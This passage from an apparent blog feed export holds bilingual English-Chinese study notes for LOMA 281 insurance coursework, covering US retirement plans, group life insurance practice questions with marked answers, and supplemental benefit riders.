agencies<ul><li>计划发起人必须向计划参与者和政府机构提供某些报告</li></ul></li><li>The plan must meet certain minimum vesting requirements regarding a participant’s right to receive plan benefits<ul><li>该计划必须满足一些最低归属要求，关于参与者获得计划福利的权利。</li></ul></li></ul><p>Vesting Schedules： 投资方式</p><ul><li>Employees are immediately vested in 100 percent of their own retirement plan contributions. 员工的退休计划投资是立即生效的，即100%的员工投资。</li><li>Employer contributions vest according to one of two types of vesting schedules: 雇主的退休计划投资有两种不同的生效方式<ul><li>Graded vesting (or step vesting) 等级生效（或步进生效）：这种方式是按照一定比例的年数进行投资，比如每年投资10%，投资10年后，雇主的投资比例将达到100%</li><li>Cliff vesting 顶峰生效（或峰值生效）：这种方式是从开始投资的那一刻开始，雇主的投资比例就达到100%，无需等待。</li></ul></li></ul><h2 id="Defined-Benefit-and-Defined-Contribution-Retirement-Plans【固定收益和固定供款退休计划】"><a href="#Defined-Benefit-and-Defined-Contribution-Retirement-Plans【固定收益和固定供款退休计划】" class="headerlink" title="Defined Benefit and Defined Contribution Retirement Plans【固定收益和固定供款退休计划】"></a>Defined Benefit and Defined Contribution Retirement Plans【固定收益和固定供款退休计划】</h2><ul><li><p><strong>defined benefit (DB) plan</strong>: A retirement plan that specifies the amount of the benefit that each plan participant will receive at retirement.</p><ul><li>固定收益（DB）计划：指定每个计划参与者在退休时将获得的收益金额的退休计划。</li><li>计划发起人必须留出足够的资金来支付承诺的福利，有义务每年至少提前为计划规定福利的一部分提供资金。公式不会告诉发起人这将花费多少。</li><li>计划发起人可从其当前应纳税所得额中扣除其代表计划参与人缴纳的金额，作为其缴纳当年的营业费用。</li><li>计划发起人承担所有投资风险。</li><li>计划参与者不进行供款，通常每月领取由年金提供的退休福利，退休福利金保证在参与者的一生中持续支付，由养老金福利担保公司（PBGC）担保。</li></ul></li><li><p><strong>defined contribution (DC) plan</strong>: A retirement plan in which retirement benefits are determined by contributions (employer and employee) and investment results.</p><ul><li>固定缴款（DC）计划：退休福利由供款（雇主和雇员）和投资结果决定的退休计划。</li><li>计划发起人为每个员工建立一个账户，代表雇员的雇主供款将分配到该雇员的帐户，投资收益和费用也分配到参与者的账户。</li><li>参与者的退休福利金额取决于参与者的账户余额，因此无法在退休日期前很长时间内准确预测。</li></ul></li></ul><hr><p>Defined Contribution Plans vs. Defined Benefit Plans:</p><ul><li>DC participants typically control the investment of their retirement funds but also assume the investment risk<ul><li>DC参与者通常控制其退休基金的投资，但也承担投资风险</li></ul></li><li>DC participants have the potential of a higher investment return than is generally earned by a DB plan<ul><li>DC参与者具有比DB计划通常获得的投资回报更高的潜力</li></ul></li><li>DC participants can often contribute, within limits, extra amounts of money to boost the balance of their accounts<ul><li>DC参与者通常可以在一定范围内提供额外金额，以提高其帐户余额</li></ul></li><li>DC participants may have emergency access to the funds in their accounts before retirement<ul><li>DC参与者可在退休前紧急使用其账户中的资金</li></ul></li></ul><h2 id="Defined-Contribution-DC-Plans【固定缴款（DC）计划】"><a href="#Defined-Contribution-DC-Plans【固定缴款（DC）计划】" class="headerlink" title="Defined Contribution (DC) Plans【固定缴款（DC）计划】"></a><strong>Defined Contribution (DC) Plans</strong>【固定缴款（DC）计划】</h2><ul><li>401(k) plan: In the United States, a type of retirement plan that allows employees to make contributions on a pre-tax basis.<ul><li>401（k）计划：美国的一种退休计划，允许雇员在税前供款。</li><li>雇主只有在雇员同意缴纳一定比例的工资的情况下，才能向雇员的401(k)账户提供匹配的供款。</li><li>投资收益通常是递延纳税的，退休时，雇员从计划中提取税前供款和投资收益时，应缴纳所得税。提前提取需要缴纳额外的罚款税。</li><li>在雇员从计划中提取供款之前，雇主为雇员提供的供款不被视为当期应税收入。</li></ul></li></ul><p>Traditional 401(k)员工缴纳的费用是<strong>税前</strong>的，即在计算员工的所得税之前，从员工的工资中扣除缴费。然而，在取款时，这些金额会受到税收。<strong>晚些纳税</strong></p><p>Roth 401(k)员工缴纳的费用是税后的，即在计算缴费之前就已经支付了税款。但是，一般情况下，在取款时这些金额是不应纳税的。<strong>提前纳税</strong></p><table><thead><tr><th></th><th>Traditional 401(k)</th><th>Roth 401(k)</th></tr></thead><tbody><tr><td><strong>Employee Pre-Tax Contributions?</strong></td><td>Yes, subject to limits</td><td>No</td></tr><tr><td><strong>Employee Post-Tax Contributions?</strong></td><td>May be allowed, in addition to pre-tax</td><td>All contributions are post-tax, subject to limits</td></tr><tr><td><strong>Income tax paid on contributions when they are withdrawn?</strong></td><td>Yes, on pre-tax contributions</td><td>No</td></tr><tr><td><strong>Income tax paid on investment earnings when they are withdrawn?</strong></td><td>Yes</td><td>No, provided certain conditions are met</td></tr></tbody></table><p>Roth 401(k) investment earnings can be withdrawn tax-free and penalty-free(免税、免罚款) <strong>IF</strong></p><p>• The account has been open for at least five years, <strong>AND</strong></p><p>• The account owner</p><ol><li>Is at least age 59 ½ OR</li><li>Has died OR</li><li>Has become disabled OR</li><li>Is a first-time homebuyer.</li></ol><hr><ul><li><p>pension plan: A lifetime monthly income benefit that begins at retirement.</p><ul><li>养老金计划：从退休时开始的终身月收入福利。</li></ul></li><li><p>Section 403(b) plan: In the United States, a type of retirement savings plan that is established by not-for-profit employers, including schools and colleges, for the benefit of employees and that allows both employers and employees to make specified contributions to the plan that reduce current taxable income.</p><ul><li>403(b) 计划：在美国，这是一种由非营利雇主（包括学校和大学）设立的退休储蓄计划，旨在为雇员提供福利。该计划允许雇主和雇员都向计划中进行特定的缴纳，以减少当前应纳税收入。</li></ul></li><li><p>Section 457 plan: In the United States, an arrangement that allows state and local governments and their employees to make contributions to a tax-deferred savings plan established for the benefit of employees.</p><ul><li>457计划：在美国，这是一种允许州和地方政府及其雇员向为员工福利而设立的税延储蓄计划进行缴纳的安排。</li></ul></li><li><p>profit-sharing plan: A defined contribution retirement plan that is funded primarily by cash contributions from the employer’s profits.</p><ul><li>利润分享计划：主要由雇主利润中的现金出资的固定缴款退休计划。</li></ul></li><li><p>stock bonus plan: A retirement plan into which a plan sponsor that is a stock company makes contributions on behalf of plan participants in the form of the corporation’s stock.</p><ul><li>股票红利计划：一种退休计划，计划发起人是一家股份公司，代表计划参与者以公司股票的形式出资。</li></ul></li></ul><h2 id="Retirement-Plans-for-Small-Business-Owners-and-the-Self-Employed【小企业主和个体经营者的退休计划】"><a href="#Retirement-Plans-for-Small-Business-Owners-and-the-Self-Employed【小企业主和个体经营者的退休计划】" class="headerlink" title="Retirement Plans for Small Business Owners and the Self-Employed【小企业主和个体经营者的退休计划】"></a><strong>Retirement Plans for Small Business Owners and the Self-Employed</strong>【小企业主和个体经营者的退休计划】</h2><p>Small businesses and the self-employed have several retirement plan options that do not have to comply fully with ERISA, including</p><ul><li><p>SEP (simplified employee pension): In the United States, a tax-advantaged employer-sponsored retirement plan in which an employer establishes and makes contributions into an <strong>IRA</strong> for each participating employee.</p><ul><li>SEP（简化雇员养老金）：在美国，一种税收优惠的雇主赞助的退休计划，其中雇主为每位参与计划的雇员建立个人退休账户并向其缴款。</li><li>SEP &#x3D; Simplified Employee Pension and IRA &#x3D; Individual Retirement Arrangement</li><li>A SEP is funded by employer contributions only, an employee is always 100% vested in his SEP IRA SEP <strong>仅由雇主</strong>供款供资，雇员始终100%归属于其SEP IRA</li></ul></li><li><p>SIMPLE IRA: In the United States, a tax-advantaged retirement plan that may be established by small employers with 100 or fewer employees, including self-employed individuals. Both the employer and employee can make contributions, up to a specified maximum, to an IRA that the employer has established for the employee.</p><ul><li>简单的个人退休计划：在美国，一种税收优惠的退休计划，可由雇员不超过100人的小雇主建立，包括个体经营者。<strong>雇主和雇员</strong>都可以向雇主为雇员建立的个人退休账户供款，最高可达到规定的上限。</li><li>an employee is always 100% vested in all SIMPLE IRA contributions 员工始终100%享有所有简单的IRA供款 </li><li>Employer contributions are excluded from the employee’s current taxable income 雇主供款不包括在雇员当前的应税收入中</li></ul></li><li><p>SIMPLE 401(k): In the United States, a qualified retirement plan that may be established by small employers with 100 or fewer employees, including self-employed individuals. Both the employer and the employee can make contributions to the 401(k) plan up to a specified maximum.</p><ul><li>简单401（k）：在美国，一种合格的退休计划，可由雇员不超过100人的小雇主（包括个体经营者）建立。雇主和雇员都可以向401（k）计划供款，最高可达规定的上限。</li><li>雇主供款不包括在雇员当前的应税收入中。</li></ul></li><li><p>Keogh Plan: In the United States, a qualified retirement plan set up by a self-employed individual, sole proprietorship, or partnership to which the business or individual can make annual tax-deductible contributions, subject to certain limits and conditions.</p><ul><li>基奥计划（Keogh Plan）：在美国，由个体经营者、独资企业或合伙企业设立的合格退休计划，企业或个人可根据特定限制和条件每年向其缴纳可抵扣税款的供款。</li><li>The business or individual makes annual tax-deductible contributions, subject to certain limits and conditions 企业或个人每年缴纳可抵扣税款，但须遵守一定的限制和条件</li><li>Investment earnings are tax-deferred 投资收益是递延税款</li><li>Contribution limits are higher than for SEP and SIMPLE plans, but Keoghs are more complex to set up and administer 供款限额高于SEP和简单计划，但KEOGH的设置和管理更为复杂</li></ul></li></ul><h2 id="课后习题-2"><a href="#课后习题-2" class="headerlink" title="课后习题"></a>课后习题</h2><p>1.The Metro Company established a group retirement plan for the benefit of its employees and appointed Adele Loy, the director of human resources at Metro, as the person responsible formaintaining accurate records on all plan participants, preparing required reports for government agencies, and providing participants with information about the plan. The plan’s assets are held in atrust account at the Pearl Insurance Company, which provides an annuity for each participant at retirement. With regard to the parties involved in a retirement plan, Metro is a</p><ul><li>plan participant</li><li>plan administrator</li><li>funding vehicle</li><li><strong>plan sponsor</strong></li></ul><blockquote><p>Metro公司为其员工的利益制定了一项集团退休计划，并任命Metro人力资源总监Adele Loy作为负责人，负责保存所有计划参与者的准确记录，为政府机构编制所需报告，并向参与者提供有关计划的信息。该计划的资产存放在珍珠保险公司的一个托管账户中，该公司为每个退休的参与者提供年金。对于涉及退休计划的各方，Metro是</p><ul><li>计划参与者</li><li>计划管理员</li><li>融资工具</li><li>计划发起人</li></ul></blockquote><p>2.In order to receive tax-advantaged status, an employee benefit plan, such as a retirement plan, must satisfy the requirements of the Employee Retirement Income Security Act (ERISA). According toERISA requirements, a retirement plan must</p><ul><li><strong>provide certain reports to governmental agencies</strong></li><li>favor highly compensated employees</li><li>stipulate that employees are immediately and fully vested in benefits provided by employer contributions</li><li>satisfy all of the above</li></ul><blockquote><p>为了获得税收优惠地位，雇员福利计划（如退休计划）必须满足《雇员退休收入保障法》（ERISA）的要求。根据托里萨的要求，退休计划必须</p><ul><li>向政府机构提供特定报告</li><li>青睐高薪员工</li><li>规定雇员立即完全享有雇主供款提供的福利</li><li>满足以上所有要求</li></ul></blockquote><p>3.The Cricket Corporation offers a qualified retirement plan to its eligible employees. This plan is a type of defined benefit plan known as a pension plan. One correct statement about Cricket’s retirement plan is that</p><ul><li>it allows the plan participants to make contributions to the plan</li><li><strong>it provides plan participants with a monthly income benefit that begins at retirement and continues for life</strong></li><li>the plan participants assume the investment risk for the plan</li><li>the plan benefits are portable for any employees who leave Cricket before retirement</li></ul><blockquote><p>板球公司为其合格的雇员提供合格的退休计划。该计划是一种固定收益计划，称为养老金计划。关于板球的退休计划，有一个正确的说法是</p><ul><li>它允许计划参与者对计划作出贡献</li><li>它为计划参与者提供从退休开始并持续终生的每月收入福利</li><li>计划参与人承担本计划的投资风险</li><li>该计划福利适用于任何在退休前离开板球俱乐部的员工</li></ul></blockquote><p>4.The following statement(s) can correctly be made about the federal income tax treatment of contributions to and earnings from a qualified defined contribution retirement plan in the United States:</p><p>​A. A plan sponsor’s contributions on behalf of a plan participant are generally considered to be taxable income to the participant in the year in which the contributions are made.</p><p>​B. Plan participants do not pay taxes on their contributions or investment earnings until those amounts are withdrawn from the plan.</p><ul><li>Both A and B</li><li>A only</li><li><strong>B only</strong></li><li>Neither A nor B</li></ul><blockquote><p>关于美国合格固定缴款退休计划的缴款和收益的联邦所得税处理，可以正确地作出以下声明：</p><p>A.计划发起人代表计划参与人的出资通常被视为参与人在出资当年的应税收入。</p><p>B.在从计划中提取供款或投资收益之前，计划参与人不缴纳供款或投资收益税。</p><ul><li>A和B</li><li>A仅限</li><li>B仅限</li><li>既不是A也不是B</li></ul></blockquote><p>5.Employees may be given a choice between contributing to a traditional 401(k) plan or a Roth 401(k) plan. In a traditional 401(k) plan, employee contributions are (<strong>pre-tax</strong> &#x2F; post-tax) contributions.Under a Roth 401(k) plan, investment earnings on contributions are subject to (tax-deferred accrual &#x2F; <strong>tax-free withdrawal</strong>), provided certain conditions are met.</p><blockquote><p>员工可以选择为传统的401（k）计划或Roth 401（k）计划供款。在传统的401（k）计划中，员工供款是（税前&#x2F;税后）供款。根据Roth 401（k）计划，如果满足某些条件，供款的投资收益将受到（递延应计税款&#x2F;免税提取）的限制。</p></blockquote><p>6.Examples of retirement plans for small employers include a Keogh Plan, a Savings Incentive Match Plan for Employees (SIMPLE) 401(k) plan, a Simplified Employee Pension (SEP), and a SIMPLE IRA. The following statements are about these plans. Select the answer choice containing the correct statement.</p><ul><li>A Keogh plan cannot be used by a self-employed person.</li><li>Unlike traditional 401(k) plans, SIMPLE 401(k) plans do not permit employer contributions to be excluded from the employee’s current taxable income.</li><li>A SEP is funded by employee contributions only.</li><li><strong>An employee is always 100% vested in all SIMPLE IRA contributions.</strong></li></ul><blockquote><p>小型雇主的退休计划示例包括Keogh计划、员工储蓄激励匹配计划（SIMPLE）401（k）计划、简化员工养老金（SEP）和简单IRA。以下是关于这些计划的陈述。选择包含正确语句的答案选项。</p><ul><li>Keogh计划不能由个体经营者使用。</li><li>与传统的401（k）计划不同，简单的401（k）计划不允许将雇主供款排除在雇员当前的应税收入之外。</li><li>SEP仅由员工供款提供资金。</li><li>雇员总是100%享有所有简单的IRA供款。</li></ul></blockquote><h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>1.On August 1, Lynn Vaughn was hired by the Rockwall Corporation. Rockwall’s group life insurance policy has a 3-month probationary period and a 31-day eligibility period. The plan also contains anreturn to work until November 5. In this situation, the earliest date that Ms. Vaughn can enroll for Rockwall’s group life insurance coverage is</p><ul><li>October 31</li><li><strong>November 5</strong></li><li>November 30</li><li>October 31 of the following year</li></ul><blockquote><p>8月1日，Lynn Vaughn被Rockwall公司聘用。Rockwall的团体人寿保险政策有3个月的试用期和31天的合格期。该计划还包括11月5日前的复工计划。在这种情况下，Vaughn女士参加Rockwall集团人寿保险的最早日期为</p><ul><li>10月31日</li><li><strong>11月5日</strong></li><li>11月30日</li><li>次年10月31日</li></ul></blockquote><p>2.The Startsky Corporation offers a defined benefit qualified retirement plan to its eligible employees. One key feature of Startsky’s defined benefit plan is that</p><ul><li><strong>Startsky assumes the investment risk for the plan</strong></li><li>plan participants can transfer their benefits to another employer when they leave Startsky</li><li>Startsky, as well as plan participants, can contribute to the plan</li><li>plan participants’ retirement benefits are unknown until retirement</li></ul><blockquote><p>Startsky公司为其合格员工提供固定福利合格退休计划。Startsky设定受益计划的一个关键特征是</p><ul><li>Startsky承担该计划的投资风险</li><li>计划参与者可以在离开Startsky时将其福利转移给其他雇主</li><li>Startsky以及计划参与者可以为计划做出贡献</li><li>计划参与者的退休福利在退休前是未知的</li></ul></blockquote><p>3.The Rosebud Corporation offers group life insurance coverage to its 300 employees according to the following benefit schedule:</p><table><thead><tr><th>Annual Salary</th><th>Amount of Life Insurance</th></tr></thead><tbody><tr><td>Less than $100,000</td><td>1 × salary</td></tr><tr><td>$100,000 to $200,000</td><td>2 × salary</td></tr><tr><td>Over $200,000</td><td>3 × salary</td></tr></tbody></table><p>Teresa Carter, a Rosebud employee, earns a salary of \$125,000. Rosebud’s plan also offers group life insurance coverage to an employee’s dependents, and Teresa has coverage on her husband,Daniel. Assuming that Rosebud’s group life insurance plan is typical, the amount of group life insurance coverage that Teresa is eligible for is equal to</p><ul><li>$125,000, and the amount of group life insurance coverage that Daniel is eligible to receive is equal to the amount that Teresa receives</li><li>$125,000, and the amount of group life insurance coverage that Daniel is eligible to receive is less than the amount that Teresa receives</li><li>$250,000, and the amount of group life insurance coverage that Daniel is eligible to receive is equal to the amount that Teresa receives</li><li><strong>$250,000, and the amount of group life insurance coverage that Daniel is eligible to receive is less than the amount that Teresa receives</strong></li></ul><blockquote><p>Rosebud Corporation根据以下福利计划为其300名员工提供团体人寿保险：</p><table><thead><tr><th>年薪</th><th>人寿保险金额</th></tr></thead><tbody><tr><td>10万美元以下</td><td>1倍工资</td></tr><tr><td>10万美元至20万美元</td><td>2倍工资</td></tr><tr><td>20万美元</td><td>3倍工资</td></tr></tbody></table><p>特雷莎·卡特是玫瑰芽公司的员工，她的薪水是125000美元。Rosebud的计划还为员工的家属提供团体人寿保险，Teresa为她的丈夫Daniel提供保险。假设Rosebud的团体人寿保险计划是典型的，Teresa有资格获得的团体人寿保险金额等于</p><ul><li>125000美元，Daniel有资格获得的团体人寿保险金额等于Teresa获得的金额</li><li>125000美元，且Daniel有资格获得的团体人寿保险金额小于Teresa获得的金额</li><li>250000美元，Daniel有资格获得的团体人寿保险金额等于Teresa获得的金额</li><li>250000美元，Daniel有资格获得的团体人寿保险金额低于Teresa获得的金额</li></ul></blockquote><p>4.The following groups have applied for group life insurance coverage from the Archbell Insurance Company:</p><p>• Group A—People who are members of a national association of landscapers</p><p>• Group B—Six ski team members formed a club solely to get a group insurance policy</p><p>• Group C—Members of the Barret Credit Union</p><p>• Group D—The full-time employees of the Lakeside Corporation</p><p>Of these groups, the one that, based on the reason for its existence, will likely fail to qualify for group insurance coverage is</p><ul><li>Group A</li><li><strong>Group B</strong></li><li>Group C</li><li>Group D</li></ul><blockquote><p>以下团体已向Archbell保险公司申请团体人寿保险：</p><p>•A组——国家园林设计师协会成员</p><p>•B组—六名滑雪队成员组成一个俱乐部，只为获得团体保险单</p><p>•C组——巴雷特信用合作社成员</p><p>•D组——湖滨公司的全职员工</p><p>在这些群体中，基于其存在的原因，可能不符合团体保险范围的群体是</p><ul><li>A组</li><li>B组</li><li>C组</li><li>D组</li></ul></blockquote><p>5.In order to provide its employees with life insurance coverage, the Yanzee Corporation entered into a group life insurance contract with the Proudlion Insurance Company. Wade Aberdeen is a Yanzeeemployee who is covered by this group insurance plan. Mr. Aberdeen (is &#x2F; <strong>is not</strong>) a party to this group insurance contract. In this situation, Mr. Aberdeen is known as a group (<strong>insured</strong> &#x2F;policyholder).</p><blockquote><p>为了向雇员提供人寿保险，Yanzee公司与Proudlion保险公司签订了团体人寿保险合同。韦德阿伯丁是一个亚裔参加本团体保险计划的员工。Aberdeen先生（是&#x2F;不是）本团体保险合同的一方。在这种情况下，Aberdeen先生被称为集团（被保险人&#x2F;投保人）。</p></blockquote><p>6.In order to receive tax-advantaged status, a retirement plan must satisfy the requirements of the Employee Retirement Income Security Act (ERISA). To satisfy ERISA requirements, a retirement planmust</p><p>A. Provide certain reports to plan participants and governmental agencies</p><p>B. Meet certain minimum vesting requirements</p><p>C. Favor highly compensated employees</p><p>D. Provide that plan assets are held by an insurance company or a trust to protect their safety</p><ul><li>A, B, C,and D</li><li>A,B,and C only</li><li><strong>A, B,and D only</strong></li><li>C and D only</li></ul><blockquote><p>为了获得税收优惠地位，退休计划必须满足《雇员退休收入保障法》（ERISA）的要求。为满足ERISA要求，退休计划必须</p><p>A、 向计划参与者和政府机构提供特定报告</p><p>B、 满足某些最低归属要求</p><p>C、 青睐高薪员工</p><p>D、 规定计划资产由保险公司或信托机构持有，以保护其安全</p><ul><li>A、B、C和D</li><li>仅A、B和C</li><li>仅A、B和D</li><li>仅C和D</li></ul></blockquote><p>7.One characteristic of a traditional 401(k) plan is that</p><ul><li>employees never pay taxes on their own contributions to the plan</li><li>employees never pay taxes on employer contributions to the plan</li><li><strong>employee contributions are made on a pre-tax basis</strong></li><li>account balances are guaranteed not to lose the principal investment amount</li></ul><blockquote><p>传统401（k）计划的一个特点是</p><ul><li>员工从不为自己的计划供款纳税</li><li>雇员从不为雇主对计划的供款缴税</li><li>员工供款以税前为基础</li><li>保证账户余额不会损失本金投资金额</li></ul></blockquote><p>8.The Billingsley Corporation offers group life insurance coverage to its eligible employees through a contract with the Redrider Insurance Company. Redrider is responsible for handling theadministrative and recordkeeping aspects of this plan. Billingsley pays a portion of the premium for this group life insurance plan, and Billingsley’s participating employees pay the rest. This information indicates that Billingsley’s group life insurance plan is both</p><ul><li>a self-administered plan and a contributory plan</li><li>a self-administered plan and a noncontributory plan</li><li><strong>an insurer-administered plan and a contributory plan</strong></li><li>an insurer-administered plan and a noncontributory plan</li></ul><blockquote><p>Billingsley公司通过与Redrider保险公司签订合同，为其合格员工提供团体人寿保险。Redrider负责处理本计划的行政和记录保存方面。Billingsley为此团体人寿保险计划支付一部分保费，Billingsley的参与员工支付其余保费。此信息表明Billingsley的团体人寿保险计划</p><ul><li>自我管理计划和缴款计划</li><li>自我管理计划和非贡献计划</li><li>保险公司管理的计划和供款计划</li><li>保险公司管理计划和非供款计划</li></ul></blockquote><p>9.Premiums for group life insurance policies are usually paid (<strong>monthly</strong> &#x2F; annually). For group life insurance policies, the grace period provision usually specifies a grace period of (7 &#x2F; <strong>31</strong>) days.</p><blockquote><p>通常支付团体人寿保险单的保费（每月&#x2F;每年）。对于团体人寿保险单，宽限期规定通常规定宽限期为（7&#x2F;31）天。</p></blockquote><p>10.The Hummingbird Corporation provides contributory group life insurance coverage to its eligible employees through a group life insurance contract with the Lostway Insurance Company. Jason Shaw, a Hummingbird employee, enrolled in the group life insurance plan after the end of the eligibility period. In the health questionnaire that Mr. Shaw filled out, he misrepresented his health in a way that was material to the risk. When Mr. Shaw died six months later, Lostway discovered the misrepresentation. Hummingbird’s group life insurance contract specified a typical contestable period. In thissituation, Lostway most likely is permitted to contest the validity of</p><ul><li>both the group life insurance contract and Mr. Shaw’s coverage</li><li>the group life insurance contract, but not Mr. Shaw’s coverage</li><li><strong>Mr. Shaw’s coverage, but not the group life insurance contract</strong></li><li>neither the group life insurance contract nor Mr. Shaw’s coverage</li></ul><blockquote><p>Hummingbird公司通过与Lostway保险公司签订团体人寿保险合同，为其合格员工提供团体人寿保险。Jason Shaw是一名蜂鸟公司的员工，在资格期结束后加入了团体人寿保险计划。在肖先生填写的健康调查问卷中，他以一种对风险至关重要的方式歪曲了自己的健康状况。六个月后肖先生去世时，Lostway发现了这一误传。Hummingbird的团体人寿保险合同规定了一个典型的有争议的期限。在这种情况下，Lostway很可能被允许质疑</p><ul><li>团体人寿保险合同和Shaw先生的保险范围</li><li>团体人寿保险合同，但不包括Shaw先生的保险范围</li><li>Shaw先生的保险范围，但不是团体人寿保险合同</li><li>团体人寿保险合同和Shaw先生的保险范围</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Loma </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Loma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Loma 281 Module3</title>
      <link href="/posts/2319/"/>
      <url>/posts/2319/</url>
      
        <content type="html"><![CDATA[<h1 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h1><h2 id="Supplemental-Benefits【补充福利】"><a href="#Supplemental-Benefits【补充福利】" class="headerlink" title="Supplemental Benefits【补充福利】"></a>Supplemental Benefits【补充福利】</h2><p>Supplemental disability benefits include:</p><ul><li>waiver of premium for disability (WP) benefit 豁免残疾保险金<ul><li>the insured must be totally disabled for three to six months and continue to make the premium payments that come due before the insurer will begin waiving premium payments.</li><li>被保险人必须完全残疾三到六个月，并在保险公司开始豁免保费之前继续支付到期的保费</li><li>the insurer promises to give up—to waive—its right to collect premiums that become due while the insured is totally disabled.</li><li>保险公司承诺在被保险人完全残疾期间放弃（豁免）收取到期保费的权利。</li></ul></li><li>Waiver of Premium for Payor Benefit 保费支付豁免受益<ul><li>the insurance company will waive the right to collect a policy’s renewal premiums if the policyowner dies or becomes totally disabled.</li><li>如果保单持有人死亡或完全丧失能力，保险公司将放弃收取保单续期保费的权利。</li></ul></li><li>Disability Income Benefit 残疾收入福利<ul><li>provides a monthly income benefit to the policyowner-insured after a waiting period of three to six months,if she becomes totally disabled while the policy is in force.</li><li>如果投保人在保单有效期内完全残疾，在三到六个月的等待期之后则向投保人提供每月收入的补贴。</li><li>Total disability defined same as waiver of premium for disability (WP) benefit</li></ul></li></ul><hr><p>Waiver of Premiums Benefits Compared:</p><ul><li><p>Waiver of Premium for Disability Benefit  豁免残疾保险金</p><ul><li><p>Insurer waives policy premiums if the  <strong>insured</strong> becomes totally disabled. 如果<strong>被保险人</strong>完全残疾，保险公司将免除保险费</p></li><li><p>Designed for policies in which the policyowner is  <strong>also</strong> the policy’s insured 专为投保人<strong>也是</strong>保单被保险人的保单而设计</p></li><li><p>Total disability defined as </p><ul><li>The insured’s inability to perform the essential duties of her own occupation OR any other occupation for which she is reasonably suited by education, training, or experience. 被保险人无法履行其自身职业或其受教育、培训或经验合理适合的任何其他职业的基本职责。</li></ul></li></ul></li><li><p>Waiver of Premium for Payor Benefit  保费支付豁免受益</p><ul><li>Insurer waives policy premiums if the  <strong>policyowner</strong> dies or becomes totally disabled. 如果<strong>投保人</strong>死亡或完全残疾，保险公司将免除保险费</li><li>Designed for third-party policies in which the policyowner is  <strong>not</strong>  the policy’s insured 为第三方保单设计，其中投保人<strong>不是</strong>保单的被保险人</li><li>Total disability defined as<ul><li><strong>The policyowner’s inability to perform the essential duties of her own occupation during the first two years of disability</strong> 投保人在残疾的前两年无法履行其职业的基本职责</li><li>The policyowner’s inability to perform the essential duties of any occupation for which she is reasonably entitled by education, training, or experience after the first two years of disability</li></ul></li></ul></li></ul><h2 id="Accidental-Death-Benefits【意外死亡福利】"><a href="#Accidental-Death-Benefits【意外死亡福利】" class="headerlink" title="Accidental Death Benefits【意外死亡福利】"></a>Accidental Death Benefits【意外死亡福利】</h2><p>Accident-related benefits include:</p><ul><li>accidental death benefit—provides an additional death benefit if an accident causes the insured’s death  意外死亡福利 - 如果事故导致被保险人死亡，将提供额外的身故福利。</li><li>accidental death and dismemberment (AD&amp;D) benefit—provides an additional benefit if an accident causes the insured to die or to lose any two limbs or the sight in both eyes 意外身故和残疾（AD&amp;D）福利 - 如果事故导致被保险人死亡或失去两个或两个以上肢体，或双眼视力，将提供额外的福利。</li></ul><h2 id="Accelerated-Death-Benefit-Riders【加速身故福利附加险】"><a href="#Accelerated-Death-Benefit-Riders【加速身故福利附加险】" class="headerlink" title="Accelerated Death Benefit Riders【加速身故福利附加险】"></a>Accelerated Death Benefit Riders【加速身故福利附加险】</h2><p>Accelerated death benefits include:</p><ul><li>terminal illness (TI) benefit—pays part of the death benefit to a policyowner-insured with a terminal illness<ul><li>晚期疾病（TI）福利 - 向患有晚期疾病的保单持有人-被保险人支付部分身故福利。</li></ul></li><li>dread disease (DD) benefit—pays part of the death benefit to the policyowner if the insured suffers from a specified disease<ul><li>重大疾病（DD）福利 - 如果被保险人患有特定疾病，向保单持有人支付部分身故福利。</li></ul></li><li>long-term care (LTC) insurance benefit—pays a monthly benefit to the policyowner if the insured requires constant care for a medical condition<ul><li>长期护理（LTC）保险福利 - 如果被保险人因医疗状况需要持续护理，向保单持有人支付每月福利。</li></ul></li></ul><blockquote><p>TI: a physician-certified life expectancy of less than a specified period, usually 12 or 24 months. 医生认证的预期寿命小于指定期限，通常为12或24个月。<br>DD: The benefit can be paid in a lump sum or in installments over 6 to 12 months. 福利金可以一次性支付，也可以在6至12个月内分期支付。</p></blockquote><p><code>Life-threatening cancer</code> 重症癌症<br><code>Acquired Immune Deficiency Syndrome (AIDS)</code> 获得性免疫缺陷综合征（艾滋病）<br><code>Diabetes</code> 糖尿病，<strong>DD一般不包括</strong><br><code>End-stage kidney failure</code> 晚期肾衰竭<br><code>Heart attack </code>心脏病发作<br><code>Stroke</code>  中风<br><code>Multiple sclerosis</code> 多发性硬化症，<strong>DD一般不包括</strong><br><code>Coronary bypass surgery</code> 冠状动脉搭桥手术</p><h2 id="Insurance-Riders【保险附加条款】"><a href="#Insurance-Riders【保险附加条款】" class="headerlink" title="Insurance Riders【保险附加条款】"></a>Insurance Riders【保险附加条款】</h2><p>Three types of riders can extend life insurance policy coverage to people other than the primary insured:</p><ol><li>Spouse and children’s insurance rider</li><li>Children’s insurance rider</li><li>Second insured rider</li></ol><p>For a spouse and children’s insurance rider, ONE coverage unit usually equals:</p><blockquote><ul><li>$5,000 for a spouse</li><li>$1,000 for a child</li></ul></blockquote><ul><li>The limit for coverage units is normally 5 to 10 coverage units per policy, or \$25,000 to \$50,000 in coverage for a spouse and \$5,000 to \$10,000 in coverage for a child. 保险单位的限额通常为每份保单5至10个保险单位，或配偶为25000至50000美元，子女为5000至10000美元。</li><li>Premium per coverage unit is the same regardless of the  <strong>number</strong>  and ages of children 无论儿童人数和年龄如何，每个保险单位的保费都是相同的</li><li>The second insured’s coverage amount is not related to the primary insured’s coverage. The premium for additional coverage is based on the second insured’s own risk characteristics. The second insured can be the spouse or some other relative of the primary insured. 第二被保险人的保险金额与第一被保险人的保险金额无关。附加保险的保险费是根据第二被保险人自身的风险特点而定的。第二被保险人可以是第一被保险人的配偶或其他亲属。</li></ul><h2 id="Insurability【可保性】"><a href="#Insurability【可保性】" class="headerlink" title="Insurability【可保性】"></a>Insurability【可保性】</h2><p>Insurability benefit riders—an individual can purchase insurance without new evidence of insurability—include:</p><ul><li>Guaranteed insurability (GI) benefit 保证可保性（GI）福利<ul><li>gives the policyowner the right to purchase additional insurance of the same type as the basic life insurance policy—for an additional premium amount—on specified option dates (typically every three years) during the life of the policy without supplying evidence of the insured’s insurability. Also known as a guaranteed insurability option 